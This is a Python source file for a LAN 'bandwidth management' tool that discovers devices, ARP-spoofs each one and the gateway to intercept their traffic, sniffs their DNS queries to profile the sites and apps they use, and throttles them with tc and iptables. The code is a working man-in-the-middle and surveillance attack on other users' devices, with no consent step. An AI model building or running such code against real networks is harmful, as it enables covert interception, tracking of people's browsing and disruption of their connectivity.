#!/usr/bin/env python3
"""
NetMind Tool - Core Network Monitoring and Manipulation
Low-level bandwidth management, ARP spoofing, and traffic control
"""

import scapy.all as scapy
import os
import subprocess
import netifaces
import threading
import sys
import time
from collections import defaultdict, deque
from termcolor import colored
import statistics
import socket

# -------------------------
# Configuration
# -------------------------
class Config:
    # Monitoring interval (seconds)
    MONITOR_INTERVAL = 3
    
    # Traffic history length for ML analysis
    HISTORY_LENGTH = 20
    
    # Fairness thresholds
    MAX_SINGLE_DEVICE_PERCENT = 40  # Max % of total bandwidth per device
    MIN_GUARANTEED_KBPS = 256  # Minimum guaranteed speed per device
    
    # Auto-limit activation
    AUTO_LIMIT_ENABLED = True
    BANDWIDTH_ABUSE_THRESHOLD = 5000  # KB/s - if device exceeds, apply limits
    
    # Network capacity (auto-detect or manual)
    TOTAL_BANDWIDTH_KBPS = None  # None = auto-detect
    
    # Save state
    STATE_FILE = "/tmp/netmind_ai_state.json"

# -------------------------
# Utilities
# -------------------------
def has_root():
    return os.geteuid() == 0

def get_gateway_ip():
    try:
        return netifaces.gateways()["default"][netifaces.AF_INET][0]
    except Exception:
        print(colored("[!] Could not find default gateway.", "red"))
        sys.exit(1)

def get_default_interface():
    return netifaces.gateways()['default'][netifaces.AF_INET][1]

def get_subnet_cidr(iface):
    try:
        if_info = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]
        addr, netmask = if_info['addr'], if_info['netmask']
        ip_parts = list(map(int, addr.split('.')))
        mask_parts = list(map(int, netmask.split('.')))
        net_addr_parts = [str(ip_parts[i] & mask_parts[i]) for i in range(4)]
        network_address = ".".join(net_addr_parts)
        prefix = sum([bin(int(x)).count('1') for x in netmask.split('.')])
        return f"{network_address}/{prefix}"
    except Exception as e:
        print(colored(f"[!] Could not determine subnet. Error: {e}", "red"))
        sys.exit(1)

def enable_ip_forwarding():
    """Enable IP forwarding and tune kernel for high-throughput MITM forwarding"""
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1\n')
        print(colored("[✓] IP forwarding enabled", "green"))
    except:
        print(colored("[!] Failed to enable IP forwarding", "red"))
        return

    # --- Kernel tuning for minimal-overhead packet forwarding ---
    iface = get_default_interface()

    def _sysctl_w(key, val):
        try:
            with open(f'/proc/sys/{key.replace(".", "/")}', 'w') as f:
                f.write(str(val))
        except Exception:
            pass

    # Disable reverse-path filtering on the MITM interface.
    # Strict rp_filter (2) silently drops ARP-spoofed traffic whose source
    # IP doesn't match the expected return path, causing retransmissions.
    _sysctl_w(f'net.ipv4.conf.{iface}.rp_filter', 0)
    _sysctl_w('net.ipv4.conf.all.rp_filter', 0)

    # Let the kernel batch-process more packets per softirq cycle.
    # At 30 MB/s (~25 000 pps) the default backlog of 1000 overflows.
    _sysctl_w('net.core.netdev_max_backlog', 5000)
    _sysctl_w('net.core.netdev_budget', 600)
    _sysctl_w('net.core.netdev_budget_usecs', 8000)

    # Skip pointless TOS/priority rewrite on every forwarded packet.
    _sysctl_w('net.ipv4.ip_forward_update_priority', 0)

    # Enlarge conntrack table in case it can't be bypassed entirely.
    _sysctl_w('net.netfilter.nf_conntrack_max', 262144)

    # Disable WiFi power-save — it sleeps the radio between bursts,
    # adding 50-200 ms latency spikes that destroy forwarding throughput.
    subprocess.run(f'iw dev {iface} set power_save off',
                   shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(f'iwconfig {iface} power off',
                   shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Bigger transmit queue — prevents tail-drops when bursting.
    subprocess.run(f'ip link set {iface} txqueuelen 2000',
                   shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print(colored("[✓] Forwarding optimizations applied (rp_filter, backlog, WiFi PS off)", "green"))

def discover_clients(ip_range):
    """Quick ARP scan"""
    found = {}
    try:
        answered, _ = scapy.arping(ip_range, timeout=2, verbose=False)
        for _, rcv in answered:
            found[rcv.psrc] = rcv.hwsrc
    except Exception as e:
        print(colored(f"[!] ARP scan failed: {e}", "red"))
    return [{"ip": ip, "mac": mac} for ip, mac in found.items()]

# -------------------------
# ARP Spoofing
# -------------------------
class ARPSpoofer:
    def __init__(self, target, gateway):
        self.target, self.gateway = target, gateway
        self.spoofing = threading.Event()

    def _spoof_loop(self):
        while not self.spoofing.is_set():
            # Send to target (tell target that gateway is at our MAC)
            pkt1 = scapy.Ether(dst=self.target["mac"]) / scapy.ARP(op=2, pdst=self.target["ip"], hwdst=self.target["mac"], psrc=self.gateway["ip"])
            scapy.sendp(pkt1, verbose=False)
            
            # Send to gateway (tell gateway that target is at our MAC)
            pkt2 = scapy.Ether(dst=self.gateway["mac"]) / scapy.ARP(op=2, pdst=self.gateway["ip"], hwdst=self.gateway["mac"], psrc=self.target["ip"])
            scapy.sendp(pkt2, verbose=False)
            
            time.sleep(5)

    def start(self):
        self.spoofing.clear()
        threading.Thread(target=self._spoof_loop, daemon=True).start()

    def stop(self):
        self.spoofing.set()
        time.sleep(0.5)
        # Restore ARP
        try:
            gw_mac = self.gateway.get('mac') or scapy.getmacbyip(self.gateway['ip'])
            t_mac = self.target.get('mac') or scapy.getmacbyip(self.target['ip'])
            
            if gw_mac and t_mac:
                for _ in range(5):  # Increased to 5 for better restoration
                    scapy.send(scapy.ARP(op=2, pdst=self.target['ip'], hwdst=t_mac, psrc=self.gateway['ip'], hwsrc=gw_mac), verbose=False)
                    scapy.send(scapy.ARP(op=2, pdst=self.gateway['ip'], hwdst=gw_mac, psrc=self.target['ip'], hwsrc=t_mac), verbose=False)
                    time.sleep(0.2)
            else:
                print(colored(f"[!] Could not restore ARP for {self.target['ip']}", "yellow"))
        except Exception as e:
            print(colored(f"[!] ARP restoration error: {e}", "red"))

# -------------------------
# Traffic Monitor (iptables counters - kernel-space, zero overhead)
# -------------------------
class TrafficMonitor:
    def __init__(self, devices):
        self.devices = devices  # {ip: {"mac": ..., "name": ...}}
        self.stats = defaultdict(lambda: {"up": 0, "down": 0})
        self.history = defaultdict(lambda: deque(maxlen=Config.HISTORY_LENGTH))
        self.running = False
        self.lock = threading.Lock()
        self.ema_alpha = 0.3  # EMA smoothing factor
        self._counted_ips = set()  # IPs that have iptables counter rules
        self._baseline_needed = set()  # IPs needing first-read baseline
        self._notrack_target = None  # Conntrack bypass target name, set by _setup_iptables_counters

    def _setup_iptables_counters(self):
        """Add iptables accounting rules for each monitored device"""
        iface = get_default_interface()

        # --- Bypass conntrack for forwarded traffic (BIGGEST performance win) ---
        # nf_conntrack inspects EVERY forwarded packet to maintain connection
        # state tables.  Our counting rules are stateless ACCEPT + MARK, so
        # conntrack is pure overhead.  Skip it for packets not destined for
        # this machine (= forwarded traffic).  Local traffic (SSH, web UI)
        # keeps normal tracking.
        for target in ('CT --notrack', 'NOTRACK'):
            # Remove stale rule from previous run
            subprocess.run(
                f'iptables -t raw -D PREROUTING -i {iface} -m addrtype ! --dst-type LOCAL -j {target}',
                shell=True, stderr=subprocess.DEVNULL)
        for target in ('CT --notrack', 'NOTRACK'):
            res = subprocess.run(
                f'iptables -t raw -I PREROUTING -i {iface} -m addrtype ! --dst-type LOCAL -j {target}',
                shell=True, capture_output=True)
            if res.returncode == 0:
                self._notrack_target = target
                print(colored(f'[✓] Conntrack bypass active ({target})', 'green'))
                break

        # Remove any stale catch-all ACCEPT in FORWARD that would shadow our
        # per-device rules (e.g. left over from Docker or previous runs).
        for _ in range(5):
            res = subprocess.run(
                "iptables -D FORWARD -s 0.0.0.0/0 -d 0.0.0.0/0 -j ACCEPT",
                shell=True, stderr=subprocess.DEVNULL)
            if res.returncode != 0:
                break

        # Insert per-device rules at the TOP of the FORWARD chain so they are
        # evaluated before any blanket ACCEPT that other software may add.
        # These are lightweight ACCEPT rules — they don't add overhead because
        # matched packets would be accepted anyway; they just let us count bytes.
        # We insert in reverse order so the first device ends up at position 1.
        for ip in reversed(list(self.devices)):
            subprocess.run(f"iptables -I FORWARD 1 -s {ip} -j ACCEPT", shell=True, stderr=subprocess.DEVNULL)
            subprocess.run(f"iptables -I FORWARD 1 -d {ip} -j ACCEPT", shell=True, stderr=subprocess.DEVNULL)
            self._counted_ips.add(ip)

        # All initial IPs need a baseline read before computing deltas
        self._baseline_needed = set(self._counted_ips)
        print(colored(f"[+] iptables counters set for {len(self._counted_ips)} devices", "green"))

    def _add_counter_rules(self, ip):
        """Dynamically add iptables counter rules for a single new device"""
        if ip in self._counted_ips:
            return
        subprocess.run(f"iptables -I FORWARD 1 -s {ip} -j ACCEPT", shell=True, stderr=subprocess.DEVNULL)
        subprocess.run(f"iptables -I FORWARD 1 -d {ip} -j ACCEPT", shell=True, stderr=subprocess.DEVNULL)
        self._counted_ips.add(ip)
        self._baseline_needed.add(ip)
        print(colored(f"[+] Added iptables counters for new device {ip}", "green"))

    def _read_iptables_counters(self):
        """Read byte counters from iptables FORWARD chain"""
        counters = defaultdict(lambda: {"up": 0, "down": 0})
        try:
            result = subprocess.run(
                "iptables -L FORWARD -v -n -x",
                shell=True, capture_output=True, text=True
            )
            for line in result.stdout.splitlines():
                parts = line.split()
                if len(parts) < 9:
                    continue
                try:
                    bytes_val = int(parts[1])
                except ValueError:
                    continue
                src = parts[7]
                dst = parts[8]
                if src in self.devices:
                    counters[src]["up"] += bytes_val
                if dst in self.devices:
                    counters[dst]["down"] += bytes_val
        except Exception as e:
            print(colored(f"[!] iptables read error: {e}", "red"))
        return counters

    def start(self):
        """Start monitoring"""
        self.running = True
        self._setup_iptables_counters()
        threading.Thread(target=self._monitor_loop, daemon=True).start()
        print(colored("[+] Traffic monitor started (iptables counters)", "green"))

    def _monitor_loop(self):
        """Continuous monitoring loop — reads iptables counters with EMA smoothing"""
        last_bytes = defaultdict(lambda: {"up": 0, "down": 0})

        while self.running:
            time.sleep(Config.MONITOR_INTERVAL)

            # Auto-add iptables rules for any new devices added by ai.py
            for ip in list(self.devices):
                if ip not in self._counted_ips:
                    self._add_counter_rules(ip)

            counters = self._read_iptables_counters()

            with self.lock:
                for ip in list(self.devices):
                    cur_up = counters[ip]["up"]
                    cur_down = counters[ip]["down"]

                    # First read for this IP — set baseline, skip delta calc
                    if ip in self._baseline_needed:
                        last_bytes[ip] = {"up": cur_up, "down": cur_down}
                        self._baseline_needed.discard(ip)
                        continue

                    delta_up = max(cur_up - last_bytes[ip]["up"], 0)
                    delta_down = max(cur_down - last_bytes[ip]["down"], 0)

                    raw_up = (delta_up / 1024) / Config.MONITOR_INTERVAL
                    raw_down = (delta_down / 1024) / Config.MONITOR_INTERVAL

                    # EMA smoothing
                    prev = self.stats[ip]
                    up_kbps = self.ema_alpha * raw_up + (1 - self.ema_alpha) * prev["up"]
                    down_kbps = self.ema_alpha * raw_down + (1 - self.ema_alpha) * prev["down"]

                    self.stats[ip] = {"up": up_kbps, "down": down_kbps}
                    self.history[ip].append({"up": up_kbps, "down": down_kbps, "time": time.time()})

                    last_bytes[ip] = {"up": cur_up, "down": cur_down}

    def get_current_stats(self):
        """Get current bandwidth stats"""
        with self.lock:
            return dict(self.stats)

    def get_average_usage(self, ip, duration=60):
        """Get average usage over last N seconds"""
        with self.lock:
            history = list(self.history[ip])
            if not history:
                return {"up": 0, "down": 0}
            
            now = time.time()
            recent = [h for h in history if now - h["time"] <= duration]
            if not recent:
                return {"up": 0, "down": 0}
            
            avg_up = statistics.mean([h["up"] for h in recent])
            avg_down = statistics.mean([h["down"] for h in recent])
            return {"up": avg_up, "down": avg_down}

    def get_total_bytes(self):
        """Return cumulative byte counters from iptables for all devices"""
        return self._read_iptables_counters()

    def stop(self):
        """Stop monitoring"""
        self.running = False
        time.sleep(1)  # Allow monitor loop to finish
        # Clean up conntrack bypass rule
        if self._notrack_target:
            iface = get_default_interface()
            subprocess.run(
                f'iptables -t raw -D PREROUTING -i {iface} -m addrtype ! --dst-type LOCAL -j {self._notrack_target}',
                shell=True, stderr=subprocess.DEVNULL)
            self._notrack_target = None
        # Clean up iptables counter rules for ALL tracked IPs
        for ip in self._counted_ips:
            subprocess.run(f"iptables -D FORWARD -s {ip} -j ACCEPT 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            subprocess.run(f"iptables -D FORWARD -d {ip} -j ACCEPT 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
        self._counted_ips.clear()
        print(colored("[+] Traffic monitor stopped", "green"))

# -------------------------
# Connection Tracker
# -------------------------
class ConnectionTracker:
    """Track active connections and DNS queries for each device"""
    
    def __init__(self, devices, iface):
        self.devices = devices
        self.iface = iface
        # Track with timestamps for recency
        self.connections = defaultdict(lambda: {
            "domains": deque(maxlen=50),  # (timestamp, domain)
            "ips": deque(maxlen=50),      # (timestamp, ip)
            "ports": defaultdict(int),
            "last_activity": 0
        })
        self.dns_cache = {}  # IP -> domain name cache
        self.running = threading.Event()
        self.lock = threading.Lock()
        
    def start(self):
        """Start packet sniffing"""
        self.running.clear()
        threading.Thread(target=self._sniff_packets, daemon=True).start()
        
    def _sniff_packets(self):
        """Capture DNS packets using tcpdump (low overhead, no userspace copy)"""
        proc = None
        try:
            cmd = ["tcpdump", "-i", self.iface, "-l", "-n", "udp", "port", "53"]
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True
            )
            for line in proc.stdout:
                if self.running.is_set():
                    break
                self._process_packet_fast(line.strip())
        except Exception as e:
            print(colored(f"[!] tcpdump sniffing error: {e}", "yellow"))
        finally:
            if proc:
                try:
                    proc.terminate()
                    proc.wait(timeout=2)
                except Exception:
                    proc.kill()

    def _process_packet_fast(self, line):
        """Parse tcpdump DNS line for source IP and domain name"""
        try:
            # Example tcpdump output:
            # "14:23:45.123 IP 192.168.1.5.51234 > 8.8.8.8.53: 12345+ A? www.google.com. (33)"
            if not line or 'IP' not in line:
                return

            parts = line.split()
            try:
                ip_idx = parts.index('IP') + 1
            except ValueError:
                return

            src_with_port = parts[ip_idx]
            # Source is like "192.168.1.5.51234" — last dot-segment is the port
            src_ip = src_with_port.rsplit('.', 1)[0]

            # Only track DNS queries from monitored devices
            if src_ip not in self.devices:
                return

            # Extract domain from DNS query (look for query-type tokens)
            domain = None
            for i, part in enumerate(parts):
                if part in ('A?', 'AAAA?', 'PTR?', 'MX?', 'CNAME?', 'TXT?', 'SRV?', 'SOA?', 'NS?'):
                    if i + 1 < len(parts):
                        domain = parts[i + 1].rstrip('.').rstrip('(').strip()
                    break

            if not domain:
                return

            current_time = time.time()
            with self.lock:
                self.connections[src_ip]["last_activity"] = current_time
                # Avoid duplicate entries in recent history
                recent = [d for _, d in list(self.connections[src_ip]["domains"])[-10:]]
                if domain not in recent:
                    self.connections[src_ip]["domains"].append((current_time, domain))
        except Exception:
            pass

    def get_activity(self, ip):
        """Get connection activity for a device"""
        with self.lock:
            now = time.time()
            recent_window = 120  # Last 2 minutes
            
            # Filter recent domains (last 2 minutes)
            recent_domains = [(t, d) for t, d in self.connections[ip]["domains"] if now - t <= recent_window]
            domains_list = [d for _, d in recent_domains[-15:]]  # Last 15 recent domains
            
            # Filter recent IPs
            recent_ips_data = [(t, i) for t, i in self.connections[ip]["ips"] if now - t <= recent_window]
            ips_list = []
            for _, remote_ip in recent_ips_data[-15:]:
                if remote_ip in self.dns_cache:
                    ips_list.append(f"{remote_ip} ({self.dns_cache[remote_ip]})")
                else:
                    ips_list.append(remote_ip)
            
            # Get top 5 ports
            top_ports = []
            if self.connections[ip]["ports"]:
                sorted_ports = sorted(
                    self.connections[ip]["ports"].items(),
                    key=lambda x: x[1],
                    reverse=True
                )[:5]
                top_ports = [f"{port} ({count})" for port, count in sorted_ports]
            
            activity = {
                "domains": domains_list,
                "ips": ips_list,
                "top_ports": top_ports
            }
            
            return activity
    
    def get_summary(self, ip):
        """Get brief summary of current activity"""
        with self.lock:
            now = time.time()
            recent_window = 60  # Last 60 seconds for summary
            
            # Get recent domains only
            recent_domains = [(t, d) for t, d in self.connections[ip]["domains"] if now - t <= recent_window]
            
            if not recent_domains:
                # Check last activity time
                last_activity = self.connections[ip]["last_activity"]
                if last_activity == 0:
                    return "No activity"
                elif now - last_activity < 10:
                    return "Active (data transfer)"
                else:
                    return "Idle"
            
            # Identify services from recent domains
            domains = [d for _, d in recent_domains]
            services = []
            service_priority = {}  # Track service occurrences
            
            for domain in domains[-10:]:  # Last 10 domains
                domain_lower = domain.lower()
                
                # Check for known services
                if 'youtube' in domain_lower or 'googlevideo' in domain_lower or 'ytimg' in domain_lower:
                    service_priority['YouTube'] = service_priority.get('YouTube', 0) + 1
                elif 'netflix' in domain_lower or 'nflx' in domain_lower:
                    service_priority['Netflix'] = service_priority.get('Netflix', 0) + 1
                elif 'facebook' in domain_lower or 'fbcdn' in domain_lower or 'fbsbx' in domain_lower:
                    service_priority['Facebook'] = service_priority.get('Facebook', 0) + 1
                elif 'instagram' in domain_lower or 'cdninstagram' in domain_lower:
                    service_priority['Instagram'] = service_priority.get('Instagram', 0) + 1
                elif 'whatsapp' in domain_lower:
                    service_priority['WhatsApp'] = service_priority.get('WhatsApp', 0) + 1
                elif 'tiktok' in domain_lower or 'musical.ly' in domain_lower:
                    service_priority['TikTok'] = service_priority.get('TikTok', 0) + 1
                elif 'twitter' in domain_lower or 'twimg' in domain_lower or 'x.com' in domain_lower:
                    service_priority['Twitter/X'] = service_priority.get('Twitter/X', 0) + 1
                elif 'spotify' in domain_lower or 'scdn' in domain_lower:
                    service_priority['Spotify'] = service_priority.get('Spotify', 0) + 1
                elif 'twitch' in domain_lower:
                    service_priority['Twitch'] = service_priority.get('Twitch', 0) + 1
                elif 'amazon' in domain_lower or 'primevideo' in domain_lower:
                    service_priority['Amazon'] = service_priority.get('Amazon', 0) + 1
                elif 'google' in domain_lower and 'video' not in domain_lower:
                    service_priority['Google'] = service_priority.get('Google', 0) + 1
                elif 'discord' in domain_lower:
                    service_priority['Discord'] = service_priority.get('Discord', 0) + 1
                elif 'snapchat' in domain_lower:
                    service_priority['Snapchat'] = service_priority.get('Snapchat', 0) + 1
                elif 'reddit' in domain_lower:
                    service_priority['Reddit'] = service_priority.get('Reddit', 0) + 1
                elif 'cloudflare' in domain_lower or 'akamai' in domain_lower:
                    continue  # Skip CDN domains
                else:
                    # Extract main domain name
                    parts = domain.split('.')
                    if len(parts) >= 2:
                        main_domain = parts[-2].capitalize()
                        if len(main_domain) > 2:  # Skip short domains like 'co', 'tv'
                            service_priority[main_domain] = service_priority.get(main_domain, 0) + 1
            
            # Sort by priority (most frequent first)
            if service_priority:
                sorted_services = sorted(service_priority.items(), key=lambda x: x[1], reverse=True)
                top_services = [s[0] for s in sorted_services[:3]]
                return ', '.join(top_services)
            
            return f"Browsing ({len(domains)} sites)"
    
    def clear_history(self, ip):
        """Clear connection history for a device"""
        with self.lock:
            self.connections[ip] = {
                "domains": deque(maxlen=50),
                "ips": deque(maxlen=50),
                "ports": defaultdict(int),
                "last_activity": 0
            }
    
    def stop(self):
        """Stop tracking"""
        self.running.set()

# -------------------------
# Bandwidth Controller
# -------------------------
class BandwidthController:
    def __init__(self, iface, monitor):
        self.iface = iface
        self.monitor = monitor
        self.limits = {}  # {ip: {"down": kbps, "up": kbps}}
        self.spoofers = {}
        self.gateway = None
        self._setup_tc()

    def _setup_tc(self):
        """Initialize TC (traffic control) with lightweight fq_codel"""
        try:
            subprocess.run(f"tc qdisc del dev {self.iface} root 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            result = subprocess.run(f"tc qdisc add dev {self.iface} root fq_codel", shell=True, capture_output=True, text=True)
            if result.returncode != 0:
                print(colored(f"[!] Failed to setup TC qdisc: {result.stderr}", "red"))
                return False
            return True
        except Exception as e:
            print(colored(f"[!] TC setup failed: {e}", "red"))
            return False

    def set_gateway(self, gateway):
        """Set gateway for ARP spoofing"""
        self.gateway = gateway

    def start_spoofing(self, target):
        """Start ARP spoofing for a device"""
        if target["ip"] not in self.spoofers:
            spoofer = ARPSpoofer(target, self.gateway)
            self.spoofers[target["ip"]] = spoofer
            spoofer.start()

    def apply_limit(self, ip, down_kbps, up_kbps):
        """Apply bandwidth limit using TC"""
        # Validate input
        if down_kbps <= 0 or up_kbps <= 0:
            print(colored(f"[!] Invalid bandwidth values for {ip}: down={down_kbps}, up={up_kbps}", "red"))
            return False
        
        # Remove existing limit if present
        if ip in self.limits:
            self.remove_limit(ip)
        
        # If no limits are active, switch from fq_codel to HTB for rate limiting
        if not self.limits:
            subprocess.run(f"tc qdisc del dev {self.iface} root 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            subprocess.run(f"tc qdisc add dev {self.iface} root handle 1: htb default 10", shell=True, capture_output=True, text=True)
            subprocess.run(f"tc class add dev {self.iface} parent 1: classid 1:10 htb rate 1000mbit", shell=True, capture_output=True, text=True)
        
        mark = str((hash(ip) % 200) + 50)
        
        # Calculate burst (at least 2KB or 1.5x rate for smoother traffic)
        burst_down = max(int(down_kbps * 1.5 / 8), 2000)
        burst_up = max(int(up_kbps * 1.5 / 8), 2000)
        
        try:
            # Upload limiting using TC (traffic FROM device)
            result = subprocess.run(f"tc class add dev {self.iface} parent 1: classid 1:{mark} htb rate {up_kbps}kbit burst {burst_up}b", 
                                   shell=True, capture_output=True, text=True)
            if result.returncode != 0:
                print(colored(f"[!] Failed to add upload class for {ip}: {result.stderr.strip()}", "red"))
                return False
                
            result = subprocess.run(f"tc qdisc add dev {self.iface} parent 1:{mark} handle {mark}: sfq perturb 10", 
                                   shell=True, capture_output=True, text=True)
            if result.returncode != 0:
                print(colored(f"[!] Failed to add upload qdisc for {ip}: {result.stderr.strip()}", "red"))
                subprocess.run(f"tc class del dev {self.iface} parent 1: classid 1:{mark} 2>/dev/null", shell=True)
                return False
                
            result = subprocess.run(f"tc filter add dev {self.iface} parent 1: protocol ip prio 1 u32 match ip src {ip} flowid 1:{mark}", 
                                   shell=True, capture_output=True, text=True)
            if result.returncode != 0:
                print(colored(f"[!] Failed to add upload filter for {ip}: {result.stderr.strip()}", "red"))
                subprocess.run(f"tc qdisc del dev {self.iface} parent 1:{mark} 2>/dev/null", shell=True)
                subprocess.run(f"tc class del dev {self.iface} parent 1: classid 1:{mark} 2>/dev/null", shell=True)
                return False
            
            # Download limiting using TC (traffic TO device)
            # Use a different mark for download (mark + 200)
            mark_down = str(int(mark) + 200)
            
            result = subprocess.run(f"tc class add dev {self.iface} parent 1: classid 1:{mark_down} htb rate {down_kbps}kbit burst {burst_down}b", 
                                   shell=True, capture_output=True, text=True)
            if result.returncode != 0:
                print(colored(f"[!] Failed to add download class for {ip}: {result.stderr.strip()}", "red"))
                # Cleanup upload rules
                subprocess.run(f"tc qdisc del dev {self.iface} parent 1:{mark} 2>/dev/null", shell=True)
                subprocess.run(f"tc class del dev {self.iface} parent 1: classid 1:{mark} 2>/dev/null", shell=True)
                return False
                
            result = subprocess.run(f"tc qdisc add dev {self.iface} parent 1:{mark_down} handle {mark_down}: sfq perturb 10", 
                                   shell=True, capture_output=True, text=True)
            if result.returncode != 0:
                print(colored(f"[!] Failed to add download qdisc for {ip}: {result.stderr.strip()}", "red"))
                subprocess.run(f"tc class del dev {self.iface} parent 1: classid 1:{mark_down} 2>/dev/null", shell=True)
                subprocess.run(f"tc qdisc del dev {self.iface} parent 1:{mark} 2>/dev/null", shell=True)
                subprocess.run(f"tc class del dev {self.iface} parent 1: classid 1:{mark} 2>/dev/null", shell=True)
                return False
                
            result = subprocess.run(f"tc filter add dev {self.iface} parent 1: protocol ip prio 1 u32 match ip dst {ip} flowid 1:{mark_down}", 
                                   shell=True, capture_output=True, text=True)
            if result.returncode != 0:
                print(colored(f"[!] Failed to add download filter for {ip}: {result.stderr.strip()}", "red"))
                subprocess.run(f"tc qdisc del dev {self.iface} parent 1:{mark_down} 2>/dev/null", shell=True)
                subprocess.run(f"tc class del dev {self.iface} parent 1: classid 1:{mark_down} 2>/dev/null", shell=True)
                subprocess.run(f"tc qdisc del dev {self.iface} parent 1:{mark} 2>/dev/null", shell=True)
                subprocess.run(f"tc class del dev {self.iface} parent 1: classid 1:{mark} 2>/dev/null", shell=True)
                return False
            
            # Mark in iptables for additional control
            subprocess.run(f"iptables -t mangle -A POSTROUTING -s {ip} -j MARK --set-mark {mark}", shell=True, stderr=subprocess.DEVNULL)
            subprocess.run(f"iptables -t mangle -A PREROUTING -d {ip} -j MARK --set-mark {mark_down}", shell=True, stderr=subprocess.DEVNULL)
            
            self.limits[ip] = {"down": down_kbps, "up": up_kbps}
            print(colored(f"[✓] Limited {ip}: ↓{down_kbps}KB/s ↑{up_kbps}KB/s", "yellow"))
            return True
        except subprocess.CalledProcessError as e:
            print(colored(f"[!] Failed to apply limit to {ip}: {e}", "red"))
            # Cleanup partial rules
            self.remove_limit(ip)
            return False
        except Exception as e:
            print(colored(f"[!] Unexpected error limiting {ip}: {type(e).__name__}: {e}", "red"))
            # Cleanup partial rules
            self.remove_limit(ip)
            return False

    def remove_limit(self, ip):
        """Remove bandwidth limit"""
        if ip in self.limits:
            mark = str((hash(ip) % 200) + 50)
            mark_down = str(int(mark) + 200)
            
            # Delete upload rules (from device)
            subprocess.run(f"tc qdisc del dev {self.iface} parent 1:{mark} 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            subprocess.run(f"tc class del dev {self.iface} parent 1: classid 1:{mark} 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            
            # Delete download rules (to device)
            subprocess.run(f"tc qdisc del dev {self.iface} parent 1:{mark_down} 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            subprocess.run(f"tc class del dev {self.iface} parent 1: classid 1:{mark_down} 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            
            # Remove ALL filters matching this IP (more thorough cleanup)
            subprocess.run(f"tc filter del dev {self.iface} parent 1: protocol ip prio 1 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            
            # Re-add filters for other limited IPs (preserve their limits)
            for other_ip, limits in self.limits.items():
                if other_ip != ip:
                    other_mark = str((hash(other_ip) % 200) + 50)
                    other_mark_down = str(int(other_mark) + 200)
                    subprocess.run(f"tc filter add dev {self.iface} parent 1: protocol ip prio 1 u32 match ip src {other_ip} flowid 1:{other_mark}", shell=True, stderr=subprocess.DEVNULL)
                    subprocess.run(f"tc filter add dev {self.iface} parent 1: protocol ip prio 1 u32 match ip dst {other_ip} flowid 1:{other_mark_down}", shell=True, stderr=subprocess.DEVNULL)
            
            # Remove iptables mangle rules
            subprocess.run(f"iptables -t mangle -D POSTROUTING -s {ip} -j MARK --set-mark {mark} 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            subprocess.run(f"iptables -t mangle -D PREROUTING -d {ip} -j MARK --set-mark {mark_down} 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            
            del self.limits[ip]
            print(colored(f"[✓] Removed limit for {ip}", "green"))

    def cleanup(self):
        """Cleanup all rules"""
        print(colored("[+] Cleaning up network rules...", "cyan"))
        
        # Stop ARP spoofers first
        for ip, spoofer in list(self.spoofers.items()):
            try:
                spoofer.stop()
                print(colored(f"  ✓ Stopped spoofing {ip}", "green"))
            except Exception as e:
                print(colored(f"  ! Error stopping spoofer for {ip}: {e}", "yellow"))
        
        # Remove all bandwidth limits
        for ip in list(self.limits.keys()):
            try:
                self.remove_limit(ip)
            except Exception as e:
                print(colored(f"  ! Error removing limit for {ip}: {e}", "yellow"))
        
        # Cleanup TC rules
        try:
            subprocess.run(f"tc qdisc del dev {self.iface} root 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            print(colored("  ✓ Removed TC rules", "green"))
        except Exception as e:
            print(colored(f"  ! TC cleanup warning: {e}", "yellow"))
        
        # Cleanup iptables mangle rules
        try:
            subprocess.run("iptables -t mangle -F POSTROUTING 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            print(colored("  ✓ Flushed iptables mangle rules", "green"))
        except Exception as e:
            print(colored(f"  ! iptables cleanup warning: {e}", "yellow"))
        
        self.spoofers.clear()
        self.limits.clear()
